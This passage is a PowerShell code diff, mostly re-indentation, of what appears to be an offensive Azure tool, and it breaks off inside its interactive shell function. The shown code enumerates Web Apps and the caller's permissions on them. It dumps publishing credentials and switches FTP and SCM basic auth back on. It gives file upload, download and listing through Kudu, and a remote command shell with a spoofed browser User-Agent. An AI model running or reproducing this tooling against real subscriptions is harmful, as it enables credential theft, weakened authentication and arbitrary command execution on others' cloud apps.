@@ -344,7 +344,7 @@ function Invoke-SmartRequest {
         }
     
         $authResponse = Invoke-RestMethod -Method POST -Uri $deviceCodeUrl -Body $Body
-        $code       = $authResponse.user_code
+        $code = $authResponse.user_code
         $deviceCode = $authResponse.device_code
     
         Write-Host "`n[#] Browser will open in 5 sec, Please enter this code:" -ForegroundColor DarkYellow -NoNewline
@@ -425,571 +425,571 @@ function Invoke-SmartRequest {
 #######################################################################################################
 #######################################################################################################
 
-function Get-AllWebApps {
-    param(
-        [array]$Subscriptions,
-        [hashtable]$Headers
-    )
+    function Get-AllWebApps {
+        param(
+            [array]$Subscriptions,
+            [hashtable]$Headers
+        )
 
-    Write-Host "`n[*] Enumerating Web Apps across all subscriptions..." -ForegroundColor Cyan
-    $allApps = @()
+        Write-Host "`n[*] Enumerating Web Apps across all subscriptions..." -ForegroundColor Cyan
+        $allApps = @()
 
-    foreach ($sub in $Subscriptions) {
-        if ($sub.State -ne "Enabled") { continue }
+        foreach ($sub in $Subscriptions) {
+            if ($sub.State -ne "Enabled") { continue }
 
-        $subId   = $sub.SubscriptionId
-        $subName = $sub.SubscriptionName
+            $subId   = $sub.SubscriptionId
+            $subName = $sub.SubscriptionName
 
-        $uri  = "https://management.azure.com/subscriptions/$subId/resources?`$filter=resourceType eq 'Microsoft.Web/Sites'&api-version=2016-09-01"
-        $resp = Invoke-SmartRequest -Uri $uri -Headers $Headers -Method GET
+            $uri  = "https://management.azure.com/subscriptions/$subId/resources?`$filter=resourceType eq 'Microsoft.Web/Sites'&api-version=2016-09-01"
+            $resp = Invoke-SmartRequest -Uri $uri -Headers $Headers -Method GET
 
-        if (-not $resp -or -not $resp.value) { continue }
+            if (-not $resp -or -not $resp.value) { continue }
 
-        foreach ($app in $resp.value) {
-            $rgMatch = $app.id -match "/resourceGroups/([^/]+)/"
-            $rg = if ($rgMatch) { $Matches[1] } else { "Unknown" }
+            foreach ($app in $resp.value) {
+                $rgMatch = $app.id -match "/resourceGroups/([^/]+)/"
+                $rg = if ($rgMatch) { $Matches[1] } else { "Unknown" }
 
-            $detailUri = "https://management.azure.com/subscriptions/$subId/resourceGroups/$rg/providers/Microsoft.Web/sites/$($app.name)?api-version=2021-01-15"
-            $detail = Invoke-SmartRequest -Uri $detailUri -Headers $Headers -Method GET
+                $detailUri = "https://management.azure.com/subscriptions/$subId/resourceGroups/$rg/providers/Microsoft.Web/sites/$($app.name)?api-version=2021-01-15"
+                $detail = Invoke-SmartRequest -Uri $detailUri -Headers $Headers -Method GET
 
-            $scmHost = ""
-            if ($detail -and $detail.properties -and $detail.properties.enabledHostNames) {
-                $scmHost = $detail.properties.enabledHostNames | Where-Object { $_ -match "\.scm\." } | Select-Object -First 1
-            }
-            if (-not $scmHost -and $detail -and $detail.properties -and $detail.properties.hostNameSslStates) {
-                $scmEntry = $detail.properties.hostNameSslStates | Where-Object { $_.hostType -eq 1 -or $_.name -match "\.scm\." } | Select-Object -First 1
-                if ($scmEntry) { $scmHost = $scmEntry.name }
-            }
-            # Last fallback
-            if (-not $scmHost) { $scmHost = "$($app.name).scm.azurewebsites.net" }
+                $scmHost = ""
+                if ($detail -and $detail.properties -and $detail.properties.enabledHostNames) {
+                    $scmHost = $detail.properties.enabledHostNames | Where-Object { $_ -match "\.scm\." } | Select-Object -First 1
+                }
+                if (-not $scmHost -and $detail -and $detail.properties -and $detail.properties.hostNameSslStates) {
+                    $scmEntry = $detail.properties.hostNameSslStates | Where-Object { $_.hostType -eq 1 -or $_.name -match "\.scm\." } | Select-Object -First 1
+                    if ($scmEntry) { $scmHost = $scmEntry.name }
+                }
+                # Last fallback
+                if (-not $scmHost) { $scmHost = "$($app.name).scm.azurewebsites.net" }
 
-            $defaultHostName = if ($detail -and $detail.properties -and $detail.properties.defaultHostName) {
-                $detail.properties.defaultHostName
-            } else { "$($app.name).azurewebsites.net" }
+                $defaultHostName = if ($detail -and $detail.properties -and $detail.properties.defaultHostName) {
+                    $detail.properties.defaultHostName
+                } else { "$($app.name).azurewebsites.net" }
 
-            Write-Host "    [+] $($app.name) -> SCM: $scmHost" -ForegroundColor Gray
+                Write-Host "    [+] $($app.name) -> SCM: $scmHost" -ForegroundColor Gray
 
-            $allApps += [PSCustomObject]@{
-                Name = $app.name
-                ResourceGroup  = $rg
-                SubscriptionId  = $subId
-                SubscriptionName = $subName
-                OS  = $app.kind
-                Location = $app.location
-                ResourceId = $app.id
-                ScmHost = $scmHost
-                DefaultHostName = $defaultHostName
-                Permission = "Checking..."
+                $allApps += [PSCustomObject]@{
+                    Name = $app.name
+                    ResourceGroup  = $rg
+                    SubscriptionId  = $subId
+                    SubscriptionName = $subName
+                    OS  = $app.kind
+                    Location = $app.location
+                    ResourceId = $app.id
+                    ScmHost = $scmHost
+                    DefaultHostName = $defaultHostName
+                    Permission = "Checking..."
+                }
             }
         }
-    }
 
-    Write-Host "[+] Found $($allApps.Count) Web App(s) total" -ForegroundColor Green
-    return $allApps
-}
+        Write-Host "[+] Found $($allApps.Count) Web App(s) total" -ForegroundColor Green
+        return $allApps
+    }
 
 
 ###########################################################################################################################################
 
-function Check-Permissions {
-    param(
-        [array]$WebApps,
-        [hashtable]$Headers
-    )
+    function Check-Permissions {
+        param(
+            [array]$WebApps,
+            [hashtable]$Headers
+        )
 
-    Write-Host "`n[*] Checking permissions on each Web App..." -ForegroundColor Cyan
+        Write-Host "`n[*] Checking permissions on each Web App..." -ForegroundColor Cyan
 
-    foreach ($app in $WebApps) {
-        $uri = "https://management.azure.com/subscriptions/$($app.SubscriptionId)/resourceGroups/$($app.ResourceGroup)/providers/Microsoft.Web/sites/$($app.Name)/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
-        $resp = Invoke-SmartRequest -Uri $uri -Headers $Headers -Method GET
+        foreach ($app in $WebApps) {
+            $uri = "https://management.azure.com/subscriptions/$($app.SubscriptionId)/resourceGroups/$($app.ResourceGroup)/providers/Microsoft.Web/sites/$($app.Name)/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
+            $resp = Invoke-SmartRequest -Uri $uri -Headers $Headers -Method GET
 
-        if ($resp -and $resp.value) {
-            $actions = ($resp.value | ForEach-Object { $_.actions }) -join ","
-            $notActions = ($resp.value | ForEach-Object { $_.notActions }) -join ","
+            if ($resp -and $resp.value) {
+                $actions = ($resp.value | ForEach-Object { $_.actions }) -join ","
+                $notActions = ($resp.value | ForEach-Object { $_.notActions }) -join ","
 
-            if ($actions -match "\*") {
-                $app.Permission = "Owner/Contributor (Full)"
-            }
-            elseif ($actions -match "Microsoft\.Web/sites/publish" -or $actions -match "Microsoft\.Web/sites/config") {
-                $app.Permission = "Website Contributor"
+                if ($actions -match "\*") {
+                    $app.Permission = "Owner/Contributor (Full)"
+                }
+                elseif ($actions -match "Microsoft\.Web/sites/publish" -or $actions -match "Microsoft\.Web/sites/config") {
+                    $app.Permission = "Website Contributor"
+                }
+                else {
+                    $app.Permission = "Reader/Limited"
+                }
+
+                $credUri = "https://management.azure.com/subscriptions/$($app.SubscriptionId)/resourceGroups/$($app.ResourceGroup)/providers/Microsoft.Web/sites/$($app.Name)/config/publishingcredentials/list?api-version=2023-12-01"
+                $credResp = Invoke-SmartRequest -Method "POST" -Uri $credUri -Headers $Headers
+                if ($credResp -and $credResp.properties) {
+                    $app.Permission += " [PublishCreds: YES]"
+                }
+                else {
+                    $app.Permission += " [PublishCreds: NO]"
+                }
             }
             else {
-                $app.Permission = "Reader/Limited"
+                $app.Permission = "No Access / Denied"
             }
+        }
+        return $WebApps
+    }
 
-            $credUri = "https://management.azure.com/subscriptions/$($app.SubscriptionId)/resourceGroups/$($app.ResourceGroup)/providers/Microsoft.Web/sites/$($app.Name)/config/publishingcredentials/list?api-version=2023-12-01"
-            $credResp = Invoke-SmartRequest -Method "POST" -Uri $credUri -Headers $Headers
-            if ($credResp -and $credResp.properties) {
-                $app.Permission += " [PublishCreds: YES]"
+
+###########################################################################################################################################
+
+    function Show-WebAppMenu {
+        param([array]$WebApps)
+
+        Write-Host "`n" -NoNewline
+        Write-Host "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -" -ForegroundColor DarkCyan
+        Write-Host "# Id  # Name                   # OS           # Subscription           # Resource Group      # Permission" -ForegroundColor White
+        Write-Host "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -" -ForegroundColor DarkCyan
+
+        for ($i = 0; $i -lt $WebApps.Count; $i++) {
+            $app = $WebApps[$i]
+            $num = ($i + 1).ToString().PadRight(4)
+            $name = $app.Name.PadRight(22).Substring(0, 22)
+            $os = $app.OS.PadRight(12).Substring(0, 12)
+            $sub = $app.SubscriptionName.PadRight(22).Substring(0, 22)
+            $rg = $app.ResourceGroup.PadRight(19).Substring(0, 19)
+            $perm = $app.Permission
+
+            $color = if ($perm -match "PublishCreds: YES") {
+                        "Green" 
+                    }
+                    elseif ($perm -match "No Access") {
+                        "Red"
+                    }
+                    else { 
+                        "Yellow" 
+                    }
+
+            Write-Host " $num # $name # $os # $sub # $rg # " -NoNewline -ForegroundColor Gray
+            Write-Host "$perm" -ForegroundColor $color
+        }
+
+        Write-Host "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -" -ForegroundColor DarkCyan
+        Write-Host "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -" -ForegroundColor DarkCyan
+        Write-Host " [0] Refresh  |  [Q] Quit" -ForegroundColor DarkYellow
+        Write-Host ""
+    }
+
+
+###########################################################################################################################################
+    function Set-BasicAuth {
+        param(
+            [PSCustomObject]$App,
+            [hashtable]$Headers,
+            [bool]$Enable
+        )
+
+        $state = if ($Enable) { "Enabling" } else { "Disabling" }
+        $allow = if ($Enable) { $true } else { $false }
+        Write-Host "  [*] $state Basic Auth (FTP + SCM)..." -ForegroundColor Cyan
+
+        $body    = @{ properties = @{ allow = $allow } } | ConvertTo-Json
+        $baseUri = "https://management.azure.com/subscriptions/$($App.SubscriptionId)/resourceGroups/$($App.ResourceGroup)/providers/Microsoft.Web/sites/$($App.Name)"
+
+        $ftpUri = "$baseUri/basicPublishingCredentialsPolicies/ftp?api-version=2023-12-01"
+        $scmUri = "$baseUri/basicPublishingCredentialsPolicies/scm?api-version=2023-12-01"
+
+        Invoke-AzureRest -Method "PUT" -Uri $ftpUri -Headers $Headers -Body $body | Out-Null
+        Invoke-AzureRest -Method "PUT" -Uri $scmUri -Headers $Headers -Body $body | Out-Null
+
+        $result = if ($Enable) { "enabled" } else { "disabled" }
+        Write-Host "  [+] Basic Auth $result" -ForegroundColor Green
+    }
+
+
+###########################################################################################################################################
+    function Get-PublishingCredentials {
+        param(
+            [PSCustomObject]$App,
+            [hashtable]$Headers
+        )
+
+        Write-Host "  [*] Extracting publishing credentials..." -ForegroundColor Cyan
+        $uri  = "https://management.azure.com/subscriptions/$($App.SubscriptionId)/resourceGroups/$($App.ResourceGroup)/providers/Microsoft.Web/sites/$($App.Name)/config/publishingcredentials/list?api-version=2023-12-01"
+        $resp = Invoke-AzureRest -Method "POST" -Uri $uri -Headers $Headers
+
+        if ($resp -and $resp.properties) {
+            $username = $resp.properties.publishingUserName
+            $password = $resp.properties.publishingPassword
+            Write-Host "  [+] Username: $username" -ForegroundColor Green
+            Write-Host "  [+] Password: $password" -ForegroundColor Green
+            return @{ Username = $username; Password = $password }
+        }
+        else {
+            Write-Host "  [!] Failed to retrieve credentials" -ForegroundColor Red
+            return $null
+        }
+    }
+
+
+###########################################################################################################################################
+
+    function Normalize-VfsPath {
+        param(
+            [string]$InputPath,
+            [string]$VfsWorkDir = "site/wwwroot"
+        )
+
+        $p = $InputPath.Trim()
+
+        # Convert backslashes to forward slashes (Windows paths)
+        $p = $p -replace "\\", "/"
+
+        # Strip drive letter prefix (D:/home/, C:/home/)
+        $p = $p -replace "^[A-Za-z]:/home/", ""
+
+        # Strip absolute /home/ prefix (user types Linux full path)
+        $p = $p -replace "^/home/", ""
+
+        # Strip leading slash
+        $p = $p -replace "^/", ""
+
+        $knownRoots = "^(site/|LogFiles/|data/|SiteExtensions/|devtools/|\.)"
+        if ($p -notmatch $knownRoots) {
+            $p = "$($VfsWorkDir.TrimEnd('/'))/$p"
+        }
+
+        return $p
+    }
+
+###########################################################################################################################################
+    function Invoke-KuduDownload {
+        param(
+            [string]$ScmHost,
+            [hashtable]$AuthHeader,
+            [string]$RemotePath,
+            [string]$LocalPath
+        )
+
+        # Normalize: VFS expects path relative to home root
+        $vfsPath = Normalize-VfsPath $RemotePath
+        $uri = "https://$ScmHost/api/vfs/$vfsPath"
+
+        Write-Host "  [*] Downloading: $uri" -ForegroundColor Cyan
+        Write-Host "  [*] Saving to:   $LocalPath" -ForegroundColor Cyan
+
+        try {
+            Invoke-RestMethod -Uri $uri -Method Get -Headers $AuthHeader -OutFile $LocalPath -ErrorAction Stop
+            $size = (Get-Item $LocalPath).Length
+            $sizeStr = if ($size -gt 1MB) { "{0:N2} MB" -f ($size / 1MB) }
+                    elseif ($size -gt 1KB) { "{0:N2} KB" -f ($size / 1KB) }
+                    else { "$size bytes" }
+            Write-Host "  [+] Downloaded successfully ($sizeStr)" -ForegroundColor Green
+        }
+        catch {
+            $code = $_.Exception.Response.StatusCode.value__
+            if ($code -eq 404) {
+                Write-Host "  [!] File not found on remote: $RemotePath" -ForegroundColor Red
             }
             else {
-                $app.Permission += " [PublishCreds: NO]"
+                Write-Host "  [!] Download failed ($code): $($_.Exception.Message)" -ForegroundColor Red
             }
         }
-        else {
-            $app.Permission = "No Access / Denied"
-        }
     }
-    return $WebApps
-}
-
 
 ###########################################################################################################################################
+    function Invoke-KuduUpload {
+        param(
+            [string]$ScmHost,
+            [hashtable]$AuthHeader,
+            [string]$LocalPath,
+            [string]$RemotePath
+        )
 
-function Show-WebAppMenu {
-    param([array]$WebApps)
-
-    Write-Host "`n" -NoNewline
-    Write-Host "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -" -ForegroundColor DarkCyan
-    Write-Host "# Id  # Name                   # OS           # Subscription           # Resource Group      # Permission" -ForegroundColor White
-    Write-Host "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -" -ForegroundColor DarkCyan
-
-    for ($i = 0; $i -lt $WebApps.Count; $i++) {
-        $app = $WebApps[$i]
-        $num = ($i + 1).ToString().PadRight(4)
-        $name = $app.Name.PadRight(22).Substring(0, 22)
-        $os = $app.OS.PadRight(12).Substring(0, 12)
-        $sub = $app.SubscriptionName.PadRight(22).Substring(0, 22)
-        $rg = $app.ResourceGroup.PadRight(19).Substring(0, 19)
-        $perm = $app.Permission
-
-        $color = if ($perm -match "PublishCreds: YES") {
-                    "Green" 
-                }
-                 elseif ($perm -match "No Access") {
-                     "Red"
-                }
-                 else { 
-                    "Yellow" 
-                }
-
-        Write-Host " $num # $name # $os # $sub # $rg # " -NoNewline -ForegroundColor Gray
-        Write-Host "$perm" -ForegroundColor $color
-    }
-
-    Write-Host "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -" -ForegroundColor DarkCyan
-    Write-Host "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -" -ForegroundColor DarkCyan
-    Write-Host " [0] Refresh  |  [Q] Quit" -ForegroundColor DarkYellow
-    Write-Host ""
-}
-
-
-###########################################################################################################################################
-function Set-BasicAuth {
-    param(
-        [PSCustomObject]$App,
-        [hashtable]$Headers,
-        [bool]$Enable
-    )
-
-    $state = if ($Enable) { "Enabling" } else { "Disabling" }
-    $allow = if ($Enable) { $true } else { $false }
-    Write-Host "  [*] $state Basic Auth (FTP + SCM)..." -ForegroundColor Cyan
-
-    $body    = @{ properties = @{ allow = $allow } } | ConvertTo-Json
-    $baseUri = "https://management.azure.com/subscriptions/$($App.SubscriptionId)/resourceGroups/$($App.ResourceGroup)/providers/Microsoft.Web/sites/$($App.Name)"
-
-    $ftpUri = "$baseUri/basicPublishingCredentialsPolicies/ftp?api-version=2023-12-01"
-    $scmUri = "$baseUri/basicPublishingCredentialsPolicies/scm?api-version=2023-12-01"
-
-    Invoke-AzureRest -Method "PUT" -Uri $ftpUri -Headers $Headers -Body $body | Out-Null
-    Invoke-AzureRest -Method "PUT" -Uri $scmUri -Headers $Headers -Body $body | Out-Null
-
-    $result = if ($Enable) { "enabled" } else { "disabled" }
-    Write-Host "  [+] Basic Auth $result" -ForegroundColor Green
-}
-
-
-###########################################################################################################################################
-function Get-PublishingCredentials {
-    param(
-        [PSCustomObject]$App,
-        [hashtable]$Headers
-    )
-
-    Write-Host "  [*] Extracting publishing credentials..." -ForegroundColor Cyan
-    $uri  = "https://management.azure.com/subscriptions/$($App.SubscriptionId)/resourceGroups/$($App.ResourceGroup)/providers/Microsoft.Web/sites/$($App.Name)/config/publishingcredentials/list?api-version=2023-12-01"
-    $resp = Invoke-AzureRest -Method "POST" -Uri $uri -Headers $Headers
-
-    if ($resp -and $resp.properties) {
-        $username = $resp.properties.publishingUserName
-        $password = $resp.properties.publishingPassword
-        Write-Host "  [+] Username: $username" -ForegroundColor Green
-        Write-Host "  [+] Password: $password" -ForegroundColor Green
-        return @{ Username = $username; Password = $password }
-    }
-    else {
-        Write-Host "  [!] Failed to retrieve credentials" -ForegroundColor Red
-        return $null
-    }
-}
-
-
-###########################################################################################################################################
-
-function Normalize-VfsPath {
-    param(
-        [string]$InputPath,
-        [string]$VfsWorkDir = "site/wwwroot"
-    )
-
-    $p = $InputPath.Trim()
-
-    # Convert backslashes to forward slashes (Windows paths)
-    $p = $p -replace "\\", "/"
-
-    # Strip drive letter prefix (D:/home/, C:/home/)
-    $p = $p -replace "^[A-Za-z]:/home/", ""
-
-    # Strip absolute /home/ prefix (user types Linux full path)
-    $p = $p -replace "^/home/", ""
-
-    # Strip leading slash
-    $p = $p -replace "^/", ""
-
-    $knownRoots = "^(site/|LogFiles/|data/|SiteExtensions/|devtools/|\.)"
-    if ($p -notmatch $knownRoots) {
-        $p = "$($VfsWorkDir.TrimEnd('/'))/$p"
-    }
-
-    return $p
-}
-
-###########################################################################################################################################
-function Invoke-KuduDownload {
-    param(
-        [string]$ScmHost,
-        [hashtable]$AuthHeader,
-        [string]$RemotePath,
-        [string]$LocalPath
-    )
-
-    # Normalize: VFS expects path relative to home root
-    $vfsPath = Normalize-VfsPath $RemotePath
-    $uri = "https://$ScmHost/api/vfs/$vfsPath"
-
-    Write-Host "  [*] Downloading: $uri" -ForegroundColor Cyan
-    Write-Host "  [*] Saving to:   $LocalPath" -ForegroundColor Cyan
-
-    try {
-        Invoke-RestMethod -Uri $uri -Method Get -Headers $AuthHeader -OutFile $LocalPath -ErrorAction Stop
-        $size = (Get-Item $LocalPath).Length
-        $sizeStr = if ($size -gt 1MB) { "{0:N2} MB" -f ($size / 1MB) }
-                   elseif ($size -gt 1KB) { "{0:N2} KB" -f ($size / 1KB) }
-                   else { "$size bytes" }
-        Write-Host "  [+] Downloaded successfully ($sizeStr)" -ForegroundColor Green
-    }
-    catch {
-        $code = $_.Exception.Response.StatusCode.value__
-        if ($code -eq 404) {
-            Write-Host "  [!] File not found on remote: $RemotePath" -ForegroundColor Red
-        }
-        else {
-            Write-Host "  [!] Download failed ($code): $($_.Exception.Message)" -ForegroundColor Red
-        }
-    }
-}
-
-###########################################################################################################################################
-function Invoke-KuduUpload {
-    param(
-        [string]$ScmHost,
-        [hashtable]$AuthHeader,
-        [string]$LocalPath,
-        [string]$RemotePath
-    )
-
-    if (-not (Test-Path $LocalPath)) {
-        Write-Host "  [!] Local file not found: $LocalPath" -ForegroundColor Red
-        return
-    }
-
-    $vfsPath = Normalize-VfsPath $RemotePath
-    $uri = "https://$ScmHost/api/vfs/$vfsPath"
-
-    $fileBytes   = [System.IO.File]::ReadAllBytes($LocalPath)
-    $size = $fileBytes.Length
-    $sizeStr = if ($size -gt 1MB) { 
-        "{0:N2} MB" -f ($size / 1MB)
-    }
-    elseif ($size -gt 1KB) {
-         "{0:N2} KB" -f ($size / 1KB) 
-    }
-    else {
-         "$size bytes"
-    }
-
-    Write-Host "  [*] Uploading: $LocalPath ($sizeStr)" -ForegroundColor Cyan
-    Write-Host "  [*] Target:    $uri" -ForegroundColor Cyan
-
-    try {
-
-        $uploadHeaders = $AuthHeader.Clone()
-        $uploadHeaders["If-Match"] = "*"
-
-        Invoke-RestMethod -Uri $uri -Method Put -Headers $uploadHeaders -Body $fileBytes -ContentType "application/octet-stream" -ErrorAction Stop
-        Write-Host "  [+] Uploaded successfully" -ForegroundColor Green
-    }
-    catch {
-        $code = $_.Exception.Response.StatusCode.value__
-        Write-Host "  [!] Upload failed ($code): $($_.Exception.Message)" -ForegroundColor Red
-    }
-}
-
-###########################################################################################################################################
-function Invoke-KuduLs {
-    param(
-        [string]$ScmHost,
-        [hashtable]$AuthHeader,
-        [string]$RemotePath
-    )
-
-    # VFS directory listing requires a trailing slash
-    $vfsPath = (Normalize-VfsPath $RemotePath).TrimEnd("/") + "/"
-    $uri = "https://$ScmHost/api/vfs/$vfsPath"
-
-    try {
-        $items = Invoke-RestMethod -Uri $uri -Method Get -Headers $AuthHeader -ErrorAction Stop
-
-        if (-not $items -or $items.Count -eq 0) {
-            Write-Host "  (empty directory)" -ForegroundColor Gray
+        if (-not (Test-Path $LocalPath)) {
+            Write-Host "  [!] Local file not found: $LocalPath" -ForegroundColor Red
             return
         }
 
-        Write-Host ""
-        Write-Host "  Type   Size          Modified                 Name" -ForegroundColor DarkCyan
-        Write-Host "  ────   ────          ────────                 ────" -ForegroundColor DarkCyan
+        $vfsPath = Normalize-VfsPath $RemotePath
+        $uri = "https://$ScmHost/api/vfs/$vfsPath"
 
-        foreach ($item in $items) {
-            $isDir = if ($item.mime -eq "inode/directory") { "DIR " } else { "FILE" }
-            $color = if ($item.mime -eq "inode/directory") { "Cyan" } else { "White" }
-
-            $sizeVal = if ($item.mime -eq "inode/directory") { "-" }
-                       elseif ($item.size -gt 1MB) { "{0:N1} MB" -f ($item.size / 1MB) }
-                       elseif ($item.size -gt 1KB) { "{0:N1} KB" -f ($item.size / 1KB) }
-                       else { "$($item.size) B" }
-
-            $modified = try { ([datetime]$item.mtime).ToString("yyyy-MM-dd HH:mm:ss") } catch { $item.mtime }
-            $name = $item.name
-
-            $typeStr = $isDir.PadRight(5)
-            $sizeStr = $sizeVal.PadRight(14)
-            $modStr  = "$modified".PadRight(25)
-
-            Write-Host "  $typeStr $sizeStr $modStr " -NoNewline -ForegroundColor Gray
-            Write-Host "$name" -ForegroundColor $color
+        $fileBytes   = [System.IO.File]::ReadAllBytes($LocalPath)
+        $size = $fileBytes.Length
+        $sizeStr = if ($size -gt 1MB) { 
+            "{0:N2} MB" -f ($size / 1MB)
         }
-        Write-Host ""
-    }
-    catch {
-        $code = $_.Exception.Response.StatusCode.value__
-        if ($code -eq 404) {
-            Write-Host "  [!] Directory not found: $RemotePath" -ForegroundColor Red
+        elseif ($size -gt 1KB) {
+            "{0:N2} KB" -f ($size / 1KB) 
         }
         else {
-            Write-Host "  [!] Listing failed ($code): $($_.Exception.Message)" -ForegroundColor Red
+            "$size bytes"
+        }
+
+        Write-Host "  [*] Uploading: $LocalPath ($sizeStr)" -ForegroundColor Cyan
+        Write-Host "  [*] Target:    $uri" -ForegroundColor Cyan
+
+        try {
+
+            $uploadHeaders = $AuthHeader.Clone()
+            $uploadHeaders["If-Match"] = "*"
+
+            Invoke-RestMethod -Uri $uri -Method Put -Headers $uploadHeaders -Body $fileBytes -ContentType "application/octet-stream" -ErrorAction Stop
+            Write-Host "  [+] Uploaded successfully" -ForegroundColor Green
+        }
+        catch {
+            $code = $_.Exception.Response.StatusCode.value__
+            Write-Host "  [!] Upload failed ($code): $($_.Exception.Message)" -ForegroundColor Red
         }
     }
-}
 
 ###########################################################################################################################################
-function Start-InteractiveShell {
-    param(
-        [PSCustomObject]$App,
-        [hashtable]$Creds
-    )
+    function Invoke-KuduLs {
+        param(
+            [string]$ScmHost,
+            [hashtable]$AuthHeader,
+            [string]$RemotePath
+        )
 
-    $scmHost = $App.ScmHost
-    $cmdUri = "https://$scmHost/api/command"
+        # VFS directory listing requires a trailing slash
+        $vfsPath = (Normalize-VfsPath $RemotePath).TrimEnd("/") + "/"
+        $uri = "https://$ScmHost/api/vfs/$vfsPath"
 
-    Write-Host "  [*] SCM Endpoint: $scmHost" -ForegroundColor DarkGray
+        try {
+            $items = Invoke-RestMethod -Uri $uri -Method Get -Headers $AuthHeader -ErrorAction Stop
 
-    $pair = "$($Creds.Username):$($Creds.Password)"
-    $bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
-    $b64 = [Convert]::ToBase64String($bytes)
-    $authHeader = @{ 
-        "Authorization" = "Basic $b64" 
-        "User-Agent" =  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
+            if (-not $items -or $items.Count -eq 0) {
+                Write-Host "  (empty directory)" -ForegroundColor Gray
+                return
+            }
+
+            Write-Host ""
+            Write-Host "  Type   Size          Modified                 Name" -ForegroundColor DarkCyan
+            Write-Host "  ────   ────          ────────                 ────" -ForegroundColor DarkCyan
+
+            foreach ($item in $items) {
+                $isDir = if ($item.mime -eq "inode/directory") { "DIR " } else { "FILE" }
+                $color = if ($item.mime -eq "inode/directory") { "Cyan" } else { "White" }
+
+                $sizeVal = if ($item.mime -eq "inode/directory") { "-" }
+                        elseif ($item.size -gt 1MB) { "{0:N1} MB" -f ($item.size / 1MB) }
+                        elseif ($item.size -gt 1KB) { "{0:N1} KB" -f ($item.size / 1KB) }
+                        else { "$($item.size) B" }
+
+                $modified = try { ([datetime]$item.mtime).ToString("yyyy-MM-dd HH:mm:ss") } catch { $item.mtime }
+                $name = $item.name
+
+                $typeStr = $isDir.PadRight(5)
+                $sizeStr = $sizeVal.PadRight(14)
+                $modStr  = "$modified".PadRight(25)
+
+                Write-Host "  $typeStr $sizeStr $modStr " -NoNewline -ForegroundColor Gray
+                Write-Host "$name" -ForegroundColor $color
+            }
+            Write-Host ""
         }
-
-    $isLinux = $App.OS -match "linux"
-    $workDir = if ($isLinux) { "/home/site/wwwroot" } else { "site\\wwwroot" }
-
-
-    try {
-        while ($true) {
-            Write-Host "  [$($App.Name)] " -ForegroundColor Red -NoNewline
-            $command = Read-Host -Prompt ">>"
-
-            if ([string]::IsNullOrWhiteSpace($command)) { continue }
-            if ($command -match "^(exit|quit)$") { break }
-
-            if ($command -match "^upload\s+(.+?)\s+(.+)$") {
-                $localPath  = $Matches[1].Trim('"', "'")
-                $remotePath = $Matches[2].Trim('"', "'")
-                Invoke-KuduUpload -ScmHost $scmHost -AuthHeader $authHeader -LocalPath $localPath -RemotePath $remotePath
-                continue
+        catch {
+            $code = $_.Exception.Response.StatusCode.value__
+            if ($code -eq 404) {
+                Write-Host "  [!] Directory not found: $RemotePath" -ForegroundColor Red
             }
-
-            if ($command -match "^download\s+(.+?)\s+(.+)$") {
-                $remotePath = $Matches[1].Trim('"', "'")
-                $localPath  = $Matches[2].Trim('"', "'")
-                Invoke-KuduDownload -ScmHost $scmHost -AuthHeader $authHeader -RemotePath $remotePath -LocalPath $localPath
-                continue
-            }
-
-            if ($command -match "^vfs-ls\s*(.*)$") {
-                $remotePath = $Matches[1].Trim('"', "'")
-                if ([string]::IsNullOrWhiteSpace($remotePath)) {
-                    $remotePath = "site/wwwroot"
-                }
-                Invoke-KuduLs -ScmHost $scmHost -AuthHeader $authHeader -RemotePath $remotePath
-                continue
-            }
-
-            $commandBody = @{
-                command = $command
-                dir = $workDir
-            } | ConvertTo-Json
-
-            try {
-                $response = Invoke-RestMethod -Uri $cmdUri -Method Post -Body $commandBody -ContentType "application/json" -Headers $authHeader -ErrorAction Stop
-
-                if ($response.Output) {
-                    Write-Host $response.Output -ForegroundColor White
-                }
-                if ($response.Error) {
-                    Write-Host $response.Error -ForegroundColor Red
-                }
-                if ($response.ExitCode -ne 0) {
-                    Write-Host "  [Exit Code: $($response.ExitCode)]" -ForegroundColor Yellow
-                }
-            }
-            catch {
-                Write-Host "  [!] Command failed: $($_.Exception.Message)" -ForegroundColor Yellow
+            else {
+                Write-Host "  [!] Listing failed ($code): $($_.Exception.Message)" -ForegroundColor Red
             }
         }
     }
-    catch {
-        # Ctrl+C caught
+
+###########################################################################################################################################
+    function Start-InteractiveShell {
+        param(
+            [PSCustomObject]$App,
+            [hashtable]$Creds
+        )
+
+        $scmHost = $App.ScmHost
+        $cmdUri = "https://$scmHost/api/command"
+
+        Write-Host "  [*] SCM Endpoint: $scmHost" -ForegroundColor DarkGray
+
+        $pair = "$($Creds.Username):$($Creds.Password)"
+        $bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
+        $b64 = [Convert]::ToBase64String($bytes)
+        $authHeader = @{ 
+            "Authorization" = "Basic $b64" 
+            "User-Agent" =  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
+            }
+
+        $isLinux = $App.OS -match "linux"
+        $workDir = if ($isLinux) { "/home/site/wwwroot" } else { "site\\wwwroot" }
+
+
+        try {
+            while ($true) {
